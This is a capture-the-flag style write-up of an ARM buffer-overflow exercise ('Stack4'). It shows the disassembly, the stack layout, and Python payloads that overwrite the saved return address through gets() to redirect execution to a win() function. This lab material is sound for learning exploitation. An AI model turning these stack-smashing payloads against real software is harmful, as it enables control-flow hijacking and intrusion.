# Stack4
```
What you will learn

    How to overwrite PC
    Standard buffer overflows

Goal: change the code flow by making PC jump to the win() function.
```

Here is the assembly of the executable:
```asm
0001044c <win>:
   1044c:	e92d4800 	push	{fp, lr}
   10450:	e28db004 	add	fp, sp, #4
   10454:	e59f0004 	ldr	r0, [pc, #4]	; 10460 <win+0x14>
   10458:	ebffffa5 	bl	102f4 <puts@plt>
   1045c:	e8bd8800 	pop	{fp, pc}
   10460:	00010504 	andeq	r0, r1, r4, lsl #10

00010464 <main>:
   10464:	e92d4800 	push	{fp, lr}
   10468:	e28db004 	add	fp, sp, #4
   
   ; ===========================================
   ; Preparing the stack for the local variables
   ; ===========================================
   1046c:	e24dd048 	sub	sp, sp, #72	; 0x48
   10470:	e50b0048 	str	r0, [fp, #-72]	; 0xffffffb8
   10474:	e50b104c 	str	r1, [fp, #-76]	; 0xffffffb4
   
   ; ===========================================
   ; Getting user input and store it in a buffer
   ; ===========================================
   10478:	e24b3044 	sub	r3, fp, #68	; 0x44
   1047c:	e1a00003 	mov	r0, r3
   10480:	ebffff98 	bl	102e8 <gets@plt>
   10484:	e1a00003 	mov	r0, r3
   
   10488:	e24bd004 	sub	sp, fp, #4
   1048c:	e8bd8800 	pop	{fp, pc}
```
Pretty short.<br>
In short - there is a buffer at _fp-68_ which will store the user's input, and that's it.<br>
Before the call to **gets**, the stack will look like the following:
```
                                +---------------------+
                fp ->           |         lr          |
                                +---------------------+
                                |         fp          |
                                +---------------------+
                                |                     |
                                |       buffer        |
                                |                     |
                                +---------------------+
                                |        argv         |
                                +---------------------+
                                |        argc         |
                                +---------------------+
```
So basically, we'll need to fill the buffer and the _fp_ with junk values (68 bytes - 64 of the buffer and 4 of the _fp_), and then we'll be able to overwrite the _lr_ value,
so at the end of main this value will be popped into the _pc_.<br>
Let's try:
```sh
$ python -c "print 'A'*68 + 'DDDD'" | ./stack4 
Segmentation fault
```
Seems like it worked! Let's change the "DDDD" to the **win** function's address:
```sh
$ python -c "print 'A'*68 + '\x4c\x04\x01\x00'" | ./stack4 
code flow successfully changed
Segmentation fault
```

P.S - there is a segmentation fault at the end of the execution. So, in order to abort the execution more "gracefully", we can add 2 values whose will be popped to _fp_ and _pc_ when the **win** function will end.
```sh
$ python -c "print 'A'*68 + '\x4c\x04\x01\x00' + 'AAAA' + '\x18\x03\x01\x00'" | ./stack4  
code flow successfully changed
Aborted
```
